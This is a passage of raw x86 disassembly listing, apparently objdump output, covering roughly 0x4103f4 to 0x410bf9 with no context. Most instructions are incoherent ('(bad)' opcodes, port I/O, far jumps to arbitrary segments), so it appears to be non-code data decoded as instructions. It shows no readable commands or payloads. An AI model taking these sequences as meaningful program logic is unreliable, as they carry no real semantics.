  4103f4:	xchg   edx,eax
  4103f5:	(bad)  
  4103f6:	ds add al,0x9c
  4103f9:	inc    ebx
  4103fa:	lods   eax,DWORD PTR ds:[esi]
  4103fb:	fisubr WORD PTR [ebp+ebp*2+0x7]
  4103ff:	stc    
  410400:	mov    ds:0xfa2b8d74,al
  410405:	dec    esp
  410406:	add    al,0xa7
  410408:	(bad)  
  410409:	cmp    BYTE PTR [ebx+0x2757275],dh
  41040f:	ins    DWORD PTR es:[edi],dx
  410410:	sbb    eax,0x7d0f4c7e
  410415:	jl     0x410474
  410417:	scas   eax,DWORD PTR es:[edi]
  410418:	(bad)  
  410419:	xor    BYTE PTR [eax],dh
  41041b:	mov    edx,0x384622d5
  410420:	xlat   BYTE PTR ds:[ebx]
  410421:	(bad)  
  410422:	push   ecx
  410423:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410424:	xchg   edx,eax
  410425:	sub    bh,al
  410427:	mov    esp,0x8dc18419
  41042c:	dec    esp
  41042d:	and    al,0xbb
  41042f:	jecxz  0x410447
  410431:	dec    esi
  410432:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410433:	sub    ebx,DWORD PTR [ebp+0x167e7e10]
  410439:	mov    cl,0xfc
  41043b:	popa   
  41043c:	adc    ah,BYTE PTR [edx-0x8]
  41043f:	mov    WORD PTR [edi],?
  410441:	bound  eax,QWORD PTR [eax]
  410443:	(bad)  
  410444:	jb     0x4103ea
  410446:	fdivr  QWORD PTR [ebx-0x64eb533]
  41044c:	out    dx,eax
  41044d:	dec    eax
  41044e:	or     bl,BYTE PTR [ecx-0x3]
  410451:	add    al,0xbd
  410453:	(bad)  
  410454:	mov    edx,0x42fe6efa
  410459:	pop    es
  41045a:	in     al,dx
  41045b:	inc    edi
  41045c:	add    eax,0xd71e238e
  410461:	sbb    ebp,DWORD PTR [eax+0x63]
  410464:	in     eax,dx
  410465:	test   eax,0x8f350f5f
  41046a:	leave  
  41046b:	fs sbb al,0x22
  41046e:	adc    BYTE PTR [eax+0x1276008e],bl
  410474:	add    DWORD PTR [ebx-0xa],0x7a
  410478:	(bad)  
  410479:	adc    eax,0x3c7b393a
  41047e:	aam    0xa2
  410480:	and    dh,BYTE PTR [ecx-0x334c42e5]
  410486:	(bad)  
  410487:	xchg   ebp,eax
  410488:	int    0x58
  41048a:	inc    ecx
  41048b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41048c:	mov    ecx,ebx
  41048e:	or     eax,0xf1938956
  410493:	ss lock push 0x8ba7c95b
  41049a:	cmp    eax,esi
  41049c:	es out dx,eax
  41049e:	in     eax,0x46
  4104a0:	jl     0x41045b
  4104a2:	je     0x410481
  4104a4:	ss push edi
  4104a6:	push   ds
  4104a7:	in     eax,dx
  4104a8:	ins    BYTE PTR es:[edi],dx
  4104a9:	push   ecx
  4104aa:	cli    
  4104ab:	aam    0xd6
  4104ad:	mov    dl,0xcb
  4104af:	mov    eax,0x7edc9f02
  4104b4:	stos   BYTE PTR es:[edi],al
  4104b5:	std    
  4104b6:	mov    esp,0x2b5ef61f
  4104bb:	adc    al,0x74
  4104bd:	mov    ah,0xd9
  4104bf:	jle    0x4104ef
  4104c1:	jae    0x41049e
  4104c3:	ss enter 0x6089,0x42
  4104c8:	imul   edi,DWORD PTR [eax+0x34],0x64
  4104cc:	das    
  4104cd:	test   eax,0x8461813
  4104d2:	lock and ecx,DWORD PTR [ebx-0x79]
  4104d6:	test   BYTE PTR [edi-0x4f3778c0],dl
  4104dc:	test   al,0x9e
  4104de:	out    0xa0,al
  4104e0:	adc    edx,edi
  4104e2:	mov    al,ds:0xc9084804
  4104e7:	pusha  
  4104e8:	push   cs
  4104e9:	lods   al,BYTE PTR ds:[esi]
  4104ea:	int    0x76
  4104ec:	lds    ebp,FWORD PTR [esi-0x4d]
  4104ef:	mov    ecx,DWORD PTR [ecx+0x21964ab8]
  4104f5:	adc    edx,DWORD PTR [esp+ebx*2+0x29eeff92]
  4104fc:	pop    ebx
  4104fd:	loopne 0x4104bc
  4104ff:	or     esp,DWORD PTR [eax]
  410501:	mov    dl,0x16
  410503:	dec    edi
  410504:	xchg   edx,eax
  410505:	cmp    BYTE PTR [esi+0xc81a8f2],dh
  41050b:	loope  0x410524
  41050d:	lock outs dx,DWORD PTR ds:[esi]
  41050f:	xor    bl,0xbc
  410512:	fs call 0x3041:0xf4c241cd
  41051a:	push   ebx
  41051b:	xor    eax,0xae018258
  410520:	(bad)  
  410521:	clc    
  410522:	xchg   esi,eax
  410523:	jp     0x410539
  410525:	loop   0x410594
  410527:	pop    ss
  410528:	fisubr WORD PTR [ebp+ebp*4-0x4eeee02f]
  41052f:	pop    ss
  410530:	out    dx,al
  410531:	mov    WORD PTR [ebx-0x7809c952],ss
  410537:	ss scas al,BYTE PTR es:[edi]
  410539:	push   es
  41053a:	call   0xf1be:0x2b46cb6d
  410541:	out    dx,eax
  410542:	inc    ebp
  410543:	push   ss
  410544:	push   esi
  410545:	or     al,0xad
  410547:	repnz adc bl,BYTE PTR [ebx+ebp*4]
  41054b:	in     eax,0x83
  41054d:	xchg   DWORD PTR [ebp-0x3],esp
  410550:	(bad)  
  410551:	mov    eax,0x2ca0df1
  410556:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410558:	adc    al,0x41
  41055a:	add    DWORD PTR [esi+ecx*2],ecx
  41055d:	jb     0x410593
  41055f:	jne    0x41054e
  410561:	xor    DWORD PTR [ecx+0x33],ebp
  410564:	adc    eax,0x91a40506
  410569:	mov    dh,0xae
  41056b:	mov    bh,0x58
  41056d:	push   ebp
  41056e:	(bad)  
  41056f:	sub    DWORD PTR [ebp-0x43],edi
  410572:	bound  eax,QWORD PTR [esi-0x7ced5c3f]
  410578:	cmp    ebx,DWORD PTR [edx]
  41057a:	sub    eax,0xc52e7924
  41057f:	repz add al,BYTE PTR [eax-0x2adbd0a7]
  410586:	pusha  
  410587:	mov    eax,0xdc520a6
  41058c:	repz daa 
  41058e:	fbld   TBYTE PTR [ecx-0x3c]
  410591:	cld    
  410592:	dec    eax
  410593:	mov    ch,0x5b
  410595:	push   edx
  410596:	xor    eax,0xe295960e
  41059b:	and    ebx,ecx
  41059d:	shl    DWORD PTR [edx-0x35f92931],cl
  4105a3:	push   ss
  4105a4:	xchg   edi,eax
  4105a5:	fsub   st,st(3)
  4105a7:	pop    eax
  4105a8:	xor    eax,0xca7bba82
  4105ad:	adc    eax,0xdf6e59c0
  4105b2:	rcl    BYTE PTR ds:0x2d244c85,cl
  4105b8:	cld    
  4105b9:	stos   DWORD PTR es:[edi],eax
  4105ba:	in     al,dx
  4105bb:	int3   
  4105bc:	and    BYTE PTR ds:0xc985263,0x2c
  4105c3:	or     cl,BYTE PTR [eax]
  4105c5:	fwait
  4105c6:	sub    BYTE PTR [eax-0x634c7057],cl
  4105cc:	adc    eax,0xa8d2a869
  4105d1:	ficom  WORD PTR [esi]
  4105d3:	push   cs
  4105d4:	push   0xacb46091
  4105d9:	sub    ecx,DWORD PTR [edx]
  4105db:	push   ss
  4105dc:	xor    al,0xa2
  4105de:	ret    0x26d3
  4105e1:	fwait
  4105e2:	leave  
  4105e3:	mov    eax,0x2129d457
  4105e8:	jbe    0x410658
  4105ea:	push   ds
  4105eb:	dec    ecx
  4105ec:	aas    
  4105ed:	pop    ds
  4105ee:	pop    ebx
  4105ef:	pop    eax
  4105f0:	xchg   esi,eax
  4105f1:	lea    ebp,[ebp+0x556b8204]
  4105f7:	pushf  
  4105f8:	into   
  4105f9:	stos   DWORD PTR es:[edi],eax
  4105fa:	cmp    eax,0x1eabd647
  4105ff:	xor    eax,0xd3bf5aac
  410604:	fwait
  410605:	cwde   
  410606:	pop    eax
  410607:	enter  0xc063,0x77
  41060b:	sbb    eax,0x3b506a1d
  410610:	das    
  410611:	mov    BYTE PTR [ecx],dh
  410613:	fistp  QWORD PTR [esi]
  410615:	lods   al,BYTE PTR ds:[esi]
  410616:	dec    ebp
  410617:	scas   al,BYTE PTR es:[edi]
  410618:	loopne 0x41060e
  41061a:	test   BYTE PTR [ebp+0x27],al
  41061d:	out    dx,eax
  41061e:	scas   eax,DWORD PTR es:[edi]
  41061f:	cdq    
  410620:	rcl    DWORD PTR [esi+0x6a],1
  410623:	(bad)  
  410624:	jl     0x4105b2
  410626:	popa   
  410627:	aas    
  410628:	out    dx,eax
  410629:	call   0xcd76f09d
  41062e:	mov    ecx,0x2228a5a7
  410633:	push   esi
  410634:	out    0x9c,al
  410636:	ret    0xc4f4
  410639:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41063a:	jno    0x41061e
  41063c:	mov    ecx,0x7ae2d2cf
  410641:	dec    esp
  410642:	pop    ebp
  410643:	dec    ebx
  410644:	mov    edi,0xaa7c14d6
  410649:	pop    ebp
  41064a:	cld    
  41064b:	jmp    0x28eb9692
  410650:	and    al,BYTE PTR [eax]
  410652:	adc    DWORD PTR [edi+0x6e],ebp
  410655:	les    edi,FWORD PTR [edi-0x22ac0215]
  41065b:	jge    0x4106a4
  41065d:	inc    edi
  41065e:	sub    eax,0xcccfbdd7
  410663:	push   esp
  410664:	xchg   edi,eax
  410665:	xchg   esi,eax
  410666:	jne    0x4106d6
  410668:	out    0x87,eax
  41066a:	xor    dh,BYTE PTR [ecx+0x5a]
  41066d:	inc    esi
  41066e:	aas    
  41066f:	data16 sbb al,0xd0
  410672:	scas   eax,DWORD PTR es:[edi]
  410673:	mov    ebx,0x50b3df0b
  410678:	popa   
  410679:	mov    bh,0x98
  41067b:	test   BYTE PTR [ebx-0x5ec24633],ch
  410681:	es push esp
  410683:	cmp    BYTE PTR ds:0xcff7e41b,dh
  410689:	cmp    esi,0x542bc246
  41068f:	and    al,0x8c
  410691:	xchg   bx,ax
  410693:	arpl   dx,bx
  410695:	fldenv [edi-0x68]
  410698:	ret    
  410699:	mov    ebp,0xd46e93a5
  41069e:	pusha  
  41069f:	test   al,0x73
  4106a1:	popf   
  4106a2:	inc    esp
  4106a3:	inc    ebp
  4106a4:	jbe    0x410683
  4106a6:	mov    edi,0x82faeceb
  4106ab:	mov    fs,WORD PTR [ecx-0x283b85a6]
  4106b1:	push   cs
  4106b2:	or     DWORD PTR [edi+0x57],esi
  4106b5:	or     ecx,DWORD PTR [ebp+0x9b603d8]
  4106bb:	xlat   BYTE PTR ds:[ebx]
  4106bc:	jae    0x41066c
  4106be:	icebp  
  4106bf:	xchg   ebx,eax
  4106c0:	xor    ecx,ebx
  4106c2:	mov    edi,0x86548e97
  4106c7:	aad    0xda
  4106c9:	loop   0x4106ce
  4106cb:	loope  0x410653
  4106cd:	cs nop
  4106cf:	cmp    al,bl
  4106d1:	inc    ecx
  4106d2:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  4106d4:	adc    esi,eax
  4106d6:	outs   dx,BYTE PTR ds:[esi]
  4106d7:	sub    DWORD PTR [ebp-0x4d8169ec],esi
  4106dd:	cmp    DWORD PTR [ebp-0x6d],edi
  4106e0:	fisttp WORD PTR [edi*8-0x4c4d33b6]
  4106e7:	aas    
  4106e8:	push   edi
  4106e9:	mov    edi,0x9c622d81
  4106ee:	or     esi,DWORD PTR [ecx+0x30]
  4106f1:	cmc    
  4106f2:	push   cs
  4106f3:	(bad)  
  4106f5:	pop    esp
  4106f6:	aaa    
  4106f7:	jle    0x41075f
  4106f9:	push   0xc5f59d5c
  4106fe:	test   al,0xd1
  410700:	int    0xd8
  410702:	sbb    al,0x3b
  410704:	xor    bl,bl
  410706:	mov    al,bl
  410708:	gs jae 0x4106db
  41070b:	(bad)
  410710:	div    edx
  410712:	push   edi
  410713:	repnz adc esp,0xc95f2ff1
  41071a:	xor    eax,0x1a21fc91
  41071f:	or     al,0x39
  410721:	fbstp  TBYTE PTR [ebx]
  410723:	pop    ebx
  410724:	or     eax,0x549acee1
  410729:	cld    
  41072a:	pop    ss
  41072b:	pop    esp
  41072c:	sbb    al,0x43
  41072e:	imul   esp,ebp,0x7
  410731:	fldcw  WORD PTR [ebx-0x246485a3]
  410737:	jmp    0x410763
  410739:	bound  ebx,QWORD PTR [edx+0x1c057713]
  41073f:	pop    esi
  410740:	mov    al,0x87
  410742:	into   
  410743:	push   edx
  410744:	mov    WORD PTR [ebx-0x6b517863],ds
  41074a:	call   0x654726c8
  41074f:	xchg   edi,ebp
  410751:	cli    
  410752:	cs push edi
  410754:	hlt    
  410755:	(bad)  
  410756:	xor    eax,0x7d0c0a8
  41075b:	xchg   esp,eax
  41075c:	mov    ch,0x6f
  41075e:	xchg   ebx,eax
  41075f:	cmp    al,0x90
  410761:	sub    esi,edi
  410763:	xchg   esi,eax
  410764:	cmp    BYTE PTR [eiz*4-0x3bd9b89f],ah
  41076b:	enter  0xe322,0xe8
  41076f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410770:	popf   
  410771:	jg     0x410761
  410773:	sbb    eax,0xdf3fdeba
  410778:	mov    dh,0x8b
  41077a:	jns    0x4107b8
  41077c:	(bad)  
  41077d:	fist   DWORD PTR [edi-0x23]
  410780:	mov    bl,0xb4
  410782:	pop    esp
  410783:	or     al,0xf0
  410785:	stc    
  410786:	sbb    ah,dh
  410788:	push   edx
  410789:	into   
  41078a:	or     ecx,esp
  41078c:	sub    bl,bh
  41078e:	inc    edi
  41078f:	and    al,0x35
  410791:	scas   al,BYTE PTR es:[edi]
  410792:	xchg   ebx,eax
  410793:	mov    ah,0x66
  410795:	xchg   edx,eax
  410796:	push   ds
  410797:	cmp    eax,0xc7df2832
  41079c:	inc    edx
  41079d:	fstp   DWORD PTR [eax-0x70a58a7f]
  4107a3:	retf   0x3463
  4107a6:	fsub   DWORD PTR [edx+0x41]
  4107a9:	dec    edi
  4107aa:	loop   0x4107a6
  4107ac:	inc    ebp
  4107ad:	cdq    
  4107ae:	ror    esi,1
  4107b0:	xor    DWORD PTR [ebp+eiz*4+0x9],0x9510a906
  4107b8:	adc    bh,BYTE PTR [edx+0x6c]
  4107bb:	test   al,0x22
  4107bd:	ss ret 0xc454
  4107c1:	aaa    
  4107c2:	dec    DWORD PTR [esi+0x7d]
  4107c5:	pop    edx
  4107c6:	push   ss
  4107c7:	mov    cl,0x37
  4107c9:	into   
  4107ca:	ds mov esi,0x1078158a
  4107d0:	in     al,dx
  4107d1:	mov    edx,edi
  4107d3:	(bad)  
  4107d4:	cli    
  4107d5:	sub    dl,BYTE PTR [eiz*2+0x5dc8cc5f]
  4107dc:	xacquire xchg DWORD PTR cs:[ecx-0x74],ebx
  4107e1:	cmp    ah,BYTE PTR [esp+eax*8-0x50b8c010]
  4107e8:	popf   
  4107e9:	fnstcw WORD PTR [esi]
  4107eb:	test   al,0x4d
  4107ed:	imul   ecx,DWORD PTR [ebx+0x17020104],0x6c89e36d
  4107f7:	or     al,0x6c
  4107f9:	retf   0xb3c7
  4107fc:	pop    es
  4107fd:	adc    BYTE PTR [ebp-0x4d],0x5a
  410801:	fst    st(6)
  410803:	shl    BYTE PTR [ecx+0x7bb7faab],0xf1
  41080a:	lahf   
  41080b:	mov    ebx,cs
  41080d:	fs push edx
  41080f:	cmp    al,0x65
  410811:	out    dx,eax
  410812:	loop   0x41083e
  410814:	in     eax,0x9e
  410816:	and    eax,0x932c7e9f
  41081b:	aaa    
  41081c:	xor    al,0xd7
  41081e:	pop    eax
  41081f:	jb     0x4107cb
  410821:	mov    ecx,0xd9609c9
  410826:	aaa    
  410827:	fwait
  410828:	dec    esp
  410829:	xchg   edx,eax
  41082a:	sub    al,BYTE PTR [esi+ebx*8+0x6]
  41082e:	stos   BYTE PTR es:[edi],al
  41082f:	fild   QWORD PTR [edi+0x7d]
  410832:	inc    edx
  410833:	test   cl,dh
  410835:	cld    
  410836:	popf   
  410837:	shr    BYTE PTR [eax+0x4ba57dd6],0xc
  41083e:	mov    cl,0xd2
  410840:	ins    BYTE PTR es:[edi],dx
  410841:	loop   0x41089f
  410843:	sub    bh,dh
  410845:	imul   ecx,DWORD PTR [edx],0x1588cee3
  41084b:	push   esi
  41084c:	loop   0x4108bb
  41084e:	ins    DWORD PTR es:[edi],dx
  41084f:	and    BYTE PTR [edx+0x6b],0x2b
  410853:	stos   BYTE PTR es:[edi],al
  410854:	xor    ebp,ebx
  410856:	sahf   
  410857:	out    dx,al
  410858:	adc    BYTE PTR [esi],ch
  41085a:	mov    WORD PTR [ecx-0x74],ss
  41085d:	push   edx
  41085e:	push   esi
  41085f:	test   eax,0x74b73963
  410864:	adc    dh,BYTE PTR [esi+0x31eba1aa]
  41086a:	adc    edi,DWORD PTR [esi-0x4bf5628c]
  410870:	mov    BYTE PTR [ebp-0x11],0xc3
  410874:	jns    0x41088e
  410876:	aaa    
  410877:	xchg   ebx,eax
  410878:	adc    eax,DWORD PTR [edx+0x3b378fbf]
  41087e:	ficom  WORD PTR [ebp+0x355ec6ec]
  410884:	mov    dh,0x9
  410886:	adc    dh,bl
  410888:	push   cs
  410889:	mov    DWORD PTR [ecx],eax
  41088b:	push   ebx
  41088c:	ins    BYTE PTR es:[edi],dx
  41088d:	xchg   ebp,eax
  41088e:	add    eax,0xc50c97f5
  410893:	xchg   ebp,eax
  410894:	scas   eax,DWORD PTR es:[edi]
  410895:	cmp    dh,BYTE PTR [edi-0x1f6175d8]
  41089b:	dec    eax
  41089c:	add    ebx,ecx
  41089e:	or     DWORD PTR [ebx],0x70
  4108a1:	jmp    0x410895
  4108a3:	fdivr  QWORD PTR [eax+0x5d89299d]
  4108a9:	sub    esi,eax
  4108ab:	outs   dx,DWORD PTR ds:[esi]
  4108ac:	aas    
  4108ad:	fmul   QWORD PTR cs:[ecx+eiz*2]
  4108b1:	popf   
  4108b2:	in     al,dx
  4108b3:	cmp    bh,dl
  4108b5:	std    
  4108b6:	ficomp DWORD PTR ds:0x13ac99c6
  4108bc:	pop    es
  4108bd:	repnz lock out dx,eax
  4108c0:	mov    al,ds:0x39adbad3
  4108c5:	loopne 0x4108de
  4108c7:	pop    ss
  4108c8:	out    0x3a,al
  4108ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4108cb:	sbb    esp,esp
  4108cd:	push   edx
  4108ce:	xor    BYTE PTR [edi+0x4e2d8cea],bh
  4108d4:	mov    ebx,0x2acc0908
  4108d9:	jnp    0x4108b7
  4108db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4108dc:	addr16 push cs
  4108de:	pop    esp
  4108df:	push   eax
  4108e0:	or     eax,0x481e064
  4108e5:	gs push ecx
  4108e7:	sar    DWORD PTR ss:[esi-0x8],cl
  4108eb:	pop    DWORD PTR [eax+0x7f]
  4108ee:	xchg   ecx,eax
  4108ef:	mov    bl,0x89
  4108f1:	leave  
  4108f2:	mov    al,ds:0x9fb8167
  4108f7:	ins    BYTE PTR es:[edi],dx
  4108f8:	in     al,0x2b
  4108fa:	sbb    BYTE PTR [esp+ecx*2-0x7758bd53],0xe6
  410902:	sahf   
  410903:	adc    dl,BYTE PTR [edi+edx*4+0x5f]
  410907:	sub    eax,0x9d5def
  41090c:	pop    esi
  41090d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41090e:	mov    eax,ds:0x3694776b
  410913:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410914:	call   0x7d19:0xd75fa297
  41091b:	(bad)  
  41091c:	cmp    dl,BYTE PTR [ebx-0x1e]
  41091f:	sbb    BYTE PTR [eax-0x5a],0xa3
  410923:	jg     0x4108e7
  410925:	sahf   
  410926:	xchg   ebx,eax
  410927:	in     eax,dx
  410928:	mov    bl,0x7f
  41092a:	or     esp,esi
  41092c:	pop    ebx
  41092d:	mov    dl,0xe1
  41092f:	jmp    0x7d97:0xa04d9d74
  410936:	sbb    BYTE PTR [edx+ebp*1+0x585274b],bh
  41093d:	mov    WORD PTR [edx-0x3286b3de],?
  410943:	std    
  410944:	jecxz  0x410961
  410946:	test   al,0xab
  410948:	cmp    eax,0xf99eb096
  41094d:	push   edx
  41094e:	cld    
  41094f:	mov    bh,0x6b
  410951:	mov    BYTE PTR [ebx-0x429edd54],al
  410957:	xchg   BYTE PTR [edi],al
  410959:	adc    eax,DWORD PTR [ebx-0x788811b1]
  41095f:	mov    ebp,esi
  410961:	pop    ebx
  410962:	clc    
  410963:	aaa    
  410964:	mov    esi,0xb22a69c6
  410969:	(bad)  
  41096a:	sbb    al,0xfb
  41096c:	das    
  41096d:	mov    bl,0xa7
  41096f:	jno    0x41094a
  410971:	mov    al,ds:0x3186cbcd
  410976:	push   edi
  410977:	mov    DWORD PTR [ebx+0x590a9a35],ebp
  41097d:	xchg   edx,eax
  41097e:	pop    edi
  41097f:	sub    al,0xe
  410981:	fs dec esp
  410983:	outs   dx,BYTE PTR ds:[esi]
  410984:	(bad)  
  410985:	popa   
  410986:	jbe    0x410996
  410988:	outs   dx,BYTE PTR ds:[esi]
  410989:	mov    ds:0x4cfbd8ab,eax
  41098e:	les    esi,FWORD PTR [edx+0x43]
  410991:	sahf   
  410992:	or     BYTE PTR [esi-0x5c],cl
  410995:	fiadd  DWORD PTR ds:0x5d8ba39a
  41099b:	push   ebp
  41099c:	adc    ecx,DWORD PTR [eax-0x5ae5ebdf]
  4109a2:	out    dx,eax
  4109a3:	popa   
  4109a4:	(bad)  
  4109a5:	jg     0x410953
  4109a7:	repnz stc 
  4109a9:	mov    bh,0x50
  4109ab:	mov    dh,0x2c
  4109ad:	push   es
  4109ae:	push   ecx
  4109af:	imul   ebp,DWORD PTR [esi+0x1a],0xffffffda
  4109b3:	push   ds
  4109b4:	fnstenv [eax-0x589803c4]
  4109ba:	mov    eax,ds:0x5fbdaad2
  4109bf:	dec    edx
  4109c0:	mov    ecx,0xa9a61cf0
  4109c5:	or     ch,BYTE PTR [edx+0x45]
  4109c8:	sbb    al,0x25
  4109ca:	into   
  4109cb:	push   es
  4109cc:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  4109ce:	xor    esi,DWORD PTR [ebp+0x28]
  4109d1:	(bad)  
  4109d2:	xor    DWORD PTR [ecx+eiz*1-0x60],0x840ce8c0
  4109da:	dec    ebx
  4109db:	enter  0x1d0b,0xe2
  4109df:	call   0x3420dcd1
  4109e4:	dec    ebx
  4109e5:	sar    DWORD PTR [esi+eax*2],1
  4109e8:	test   eax,0x234eada6
  4109ed:	rcr    BYTE PTR [ecx+0x1c],cl
  4109f0:	stos   BYTE PTR es:[edi],al
  4109f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4109f2:	out    0x3a,eax
  4109f4:	loopne 0x410992
  4109f6:	(bad)  
  4109f7:	cmp    BYTE PTR [ebp+0x5c3dbe1f],dh
  4109fd:	xor    ah,bl
  4109ff:	rcr    DWORD PTR [ebx+0x5c],0x43
  410a03:	xchg   esi,eax
  410a04:	hlt    
  410a05:	enter  0x25b4,0xc8
  410a09:	int3   
  410a0a:	sbb    eax,0xb39cec93
  410a0f:	mov    edi,0xe1087a9c
  410a14:	jae    0x4109ef
  410a16:	arpl   WORD PTR [eax],bx
  410a18:	adc    ah,bh
  410a1a:	inc    ebx
  410a1b:	fcom   QWORD PTR [ecx+edi*4]
  410a1e:	dec    esp
  410a1f:	mov    eax,ds:0x66bc041a
  410a24:	xor    edi,DWORD PTR [esi-0x13ff601e]
  410a2a:	sbb    DWORD PTR [ecx+0x16f8e510],esi
  410a30:	repz sbb cl,BYTE PTR [eax]
  410a33:	push   esp
  410a34:	imul   esi,DWORD PTR [esi],0xffffffa1
  410a37:	pop    ebx
  410a38:	and    edx,DWORD PTR [eax+0x28391614]
  410a3e:	mov    ecx,DWORD PTR [eax+0x1f]
  410a41:	mov    al,0xff
  410a43:	xchg   esi,eax
  410a44:	fnstenv [edx+0x6f70946c]
  410a4a:	sbb    ecx,eax
  410a4c:	test   ch,dl
  410a4e:	jmp    0x82f1:0xbf1ec6b7
  410a55:	rcr    esi,1
  410a57:	dec    eax
  410a58:	icebp  
  410a59:	shl    esp,1
  410a5b:	adc    eax,0xa0199d5b
  410a60:	sbb    BYTE PTR [eax+0x3a],cl
  410a63:	hlt    
  410a64:	cld    
  410a65:	inc    eax
  410a66:	push   ss
  410a67:	out    dx,al
  410a68:	inc    edi
  410a69:	mov    BYTE PTR [eax-0x64],dh
  410a6c:	adc    eax,0x80138138
  410a71:	dec    edx
  410a72:	or     eax,0xf3757886
  410a77:	(bad)  
  410a78:	mov    esi,0x8a2ff078
  410a7d:	and    al,BYTE PTR [edx-0x3b17b24a]
  410a83:	inc    ebp
  410a84:	push   0xa99a23da
  410a89:	clc    
  410a8a:	lock sti 
  410a8c:	or     cl,BYTE PTR [edx+0xa]
  410a8f:	mov    ebp,0xbca79ace
  410a94:	leave  
  410a95:	inc    edi
  410a96:	(bad)  
  410a98:	fnsave [edx]
  410a9a:	xchg   ebp,eax
  410a9b:	mov    bh,0x9f
  410a9d:	test   BYTE PTR [eax],ah
  410a9f:	fisub  DWORD PTR [ebx-0x74f3123]
  410aa5:	push   ebx
  410aa6:	fldenv [edx+0x5e98d3b3]
  410aac:	add    al,0x33
  410aae:	cmovbe edx,ebp
  410ab1:	xor    eax,0x12700231
  410ab6:	jp     0x410b03
  410ab8:	lods   al,BYTE PTR ds:[esi]
  410ab9:	sbb    al,0xe0
  410abb:	es mov ecx,0x600cc139
  410ac1:	jmp    0x320109d0
  410ac6:	fs mov esi,0x14eee1f3
  410acc:	retf   
  410acd:	dec    ebx
  410ace:	cmp    esp,eax
  410ad0:	ins    BYTE PTR es:[edi],dx
  410ad1:	push   0xded28a03
  410ad6:	fwait
  410ad7:	pop    ecx
  410ad8:	sub    ecx,edi
  410ada:	add    dh,bl
  410adc:	push   eax
  410add:	nop
  410ade:	shl    BYTE PTR [edx+0x53034843],0x14
  410ae5:	popf   
  410ae6:	je     0x410b57
  410ae8:	(bad)  
  410ae9:	imul   ecx,DWORD PTR [esi],0xc4ecba68
  410aef:	dec    ecx
  410af0:	mov    eax,ds:0x31d25cbc
  410af5:	add    BYTE PTR [ebx+0x517bf208],al
  410afb:	or     al,0x34
  410afd:	mov    WORD PTR [esp+edx*8-0x7f051cec],?
  410b04:	(bad)  
  410b06:	mov    fs,WORD PTR [eax-0x5af4e444]
  410b0c:	data16 or BYTE PTR [eax-0x28],bl
  410b10:	nop
  410b11:	dec    ecx
  410b12:	fdiv   DWORD PTR [edi]
  410b14:	mov    dl,0xb6
  410b16:	push   esp
  410b17:	mov    al,ds:0x810e0452
  410b1c:	inc    ebx
  410b1d:	call   FWORD PTR [ebx]
  410b1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410b20:	pop    ds
  410b21:	xor    edx,DWORD PTR [ecx+0x76]
  410b24:	int    0x5a
  410b26:	or     BYTE PTR [esi],cl
  410b28:	call   0x7d753eae
  410b2d:	jmp    0xff7a:0x49b80dd
  410b34:	xor    eax,0x5b87fd7c
  410b39:	pusha  
  410b3a:	jnp    0x410b7d
  410b3c:	pop    ebp
  410b3d:	not    BYTE PTR [edi]
  410b3f:	jbe    0x410b9b
  410b41:	call   0x5993:0x1cd1a67
  410b48:	inc    ebx
  410b49:	sahf   
  410b4a:	out    0xa2,eax
  410b4c:	xchg   DWORD PTR [ebx-0x6e],eax
  410b4f:	or     ax,0x3bdc
  410b53:	jno    0x410b46
  410b55:	(bad)  
  410b56:	clc    
  410b57:	fstp   DWORD PTR [ebx-0x6e]
  410b5a:	out    0xd5,al
  410b5c:	pop    edi
  410b5d:	push   edx
  410b5e:	test   BYTE PTR [edi-0x11],ah
  410b61:	or     BYTE PTR [edi+eax*8-0x6b],dh
  410b65:	shl    esi,1
  410b67:	in     al,0x51
  410b69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410b6a:	sbb    eax,0x866df451
  410b6f:	clc    
  410b70:	test   eax,0xf114ab
  410b75:	out    0xd0,al
  410b77:	sub    cl,ah
  410b79:	ss sbb al,0xe8
  410b7c:	and    al,0xf3
  410b7e:	fadd   QWORD PTR [ecx]
  410b80:	bnd ret 
  410b82:	cmc    
  410b83:	mov    db7,edx
  410b86:	(bad)  
  410b87:	xor    eax,0xc218f2ee
  410b8c:	inc    esi
  410b8d:	lea    ecx,ds:0x96088ab3
  410b93:	iret   
  410b94:	xchg   esi,eax
  410b95:	or     DWORD PTR ds:0xf41d08c9,esi
  410b9b:	push   0x5705b380
  410ba0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ba1:	cli    
  410ba2:	xor    cl,BYTE PTR [edi+0x4f7befc5]
  410ba8:	test   eax,0xa3c67b7a
  410bad:	out    dx,eax
  410bae:	and    ebx,DWORD PTR [ebx*8-0x44b0a779]
  410bb5:	repz in eax,0xef
  410bb8:	pop    esp
  410bb9:	ss (bad) 
  410bbb:	jg     0x410b73
  410bbd:	or     DWORD PTR [esi+0x74b3e0d4],esi
  410bc3:	xchg   ebp,eax
  410bc4:	inc    ecx
  410bc5:	stos   BYTE PTR es:[edi],al
  410bc6:	es retf 
  410bc8:	(bad)  
  410bc9:	and    al,0xda
  410bcb:	mov    esp,0x6c995dff
  410bd0:	or     al,BYTE PTR [edx+0x11]
  410bd3:	pop    ebp
  410bd4:	cmp    eax,0xcd379f75
  410bd9:	push   esp
  410bda:	pop    ebx
  410bdb:	shl    DWORD PTR [ebp+0x6e],0x9d
  410bdf:	add    al,cl
  410be1:	mov    eax,ds:0x506b188d
  410be6:	sbb    DWORD PTR [ebx+0x59],ebp
  410be9:	lock ret 0x7b8
  410bed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410bee:	mov    ds:0x18c3ae1d,eax
  410bf3:	xchg   edx,eax
  410bf4:	xor    eax,0x25a5bb8e
  410bf9:	jae    0x410c71
